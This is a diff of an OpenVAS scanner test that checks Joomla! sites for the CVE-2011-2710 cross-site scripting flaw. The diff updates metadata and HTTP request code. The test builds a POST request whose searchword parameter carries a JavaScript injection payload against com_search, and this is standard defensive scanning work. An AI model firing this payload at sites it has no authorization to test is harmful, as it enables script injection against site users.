@@ -1,6 +1,6 @@
 ##############################################################################
 # OpenVAS Vulnerability Test
-# $Id: secpod_joomla_mult_xss_vuln_jul11.nasl 3114 2016-04-19 10:07:15Z benallard $
+# $Id: secpod_joomla_mult_xss_vuln_jul11.nasl 5840 2017-04-03 12:02:24Z cfi $
 #
 # Joomla! CMS Multiple Cross Site Scripting Vulnerabilities - July 2011
 #
@@ -40,8 +40,8 @@ tag_summary = "This host is running Joomla and is prone to multiple cross site
 if(description)
 {
   script_id(902541);
-  script_version("$Revision: 3114 $");
-  script_tag(name:"last_modification", value:"$Date: 2016-04-19 12:07:15 +0200 (Tue, 19 Apr 2016) $");
+  script_version("$Revision: 5840 $");
+  script_tag(name:"last_modification", value:"$Date: 2017-04-03 14:02:24 +0200 (Mon, 03 Apr 2017) $");
   script_tag(name:"creation_date", value:"2011-07-27 14:47:11 +0200 (Wed, 27 Jul 2011)");
   script_cve_id("CVE-2011-2710");
   script_tag(name:"cvss_base", value:"4.3");
@@ -52,13 +52,12 @@ if(description)
   script_xref(name : "URL" , value : "http://bl0g.yehg.net/2011/07/joomla-170-rc-and-lower-multiple-cross.html");
 
   script_tag(name:"qod_type", value:"remote_vul");
-  script_summary("Check if Joomla CMS is vulnerable to XSS");
   script_category(ACT_ATTACK);
   script_copyright("Copyright (C) 2011 SecPod");
   script_family("Web application abuses");
   script_dependencies("joomla_detect.nasl");
   script_require_ports("Services/www", 80);
-  script_require_keys("joomla/installed");
+  script_mandatory_keys("joomla/installed");
   script_tag(name : "impact" , value : tag_impact);
   script_tag(name : "affected" , value : tag_affected);
   script_tag(name : "insight" , value : tag_insight);
@@ -67,21 +66,16 @@ if(description)
   exit(0);
 }
 
-
 include("http_func.inc");
-include("version_func.inc");
 include("http_keepalive.inc");
+include("version_func.inc");
 
-## Get HTTP Port
 port = get_http_port(default:80);
-if(!port){
-  exit(0);
-}
-
-## Get Joomla Directory
 if(!dir = get_dir_from_kb(port:port,app:"joomla")) {
   exit(0);
 }
+
+host = http_host_name( port:port );
 
 ## Construct the Attack Request
 attack = string("task=search&Itemid=435&searchword=Search';onunload=function()",
@@ -94,8 +88,8 @@ attack = string("task=search&Itemid=435&searchword=Search';onunload=function()",
                 "116));};//xsssssssssss&option=com_search");
 
 req = string("POST ", dir, "/index.php HTTP/1.1\r\n",
-             "Host: ", get_host_name(), "\r\n",
-             "User-Agent: MSIE 8.0\r\n",
+             "Host: ", host, "\r\n",
+             "User-Agent: ", OPENVAS_HTTP_USER_AGENT, "\r\n",
              "Content-Type: application/x-www-form-urlencoded\r\n",
              "Content-Length: ", strlen(attack), "\r\n\r\n", attack);
 
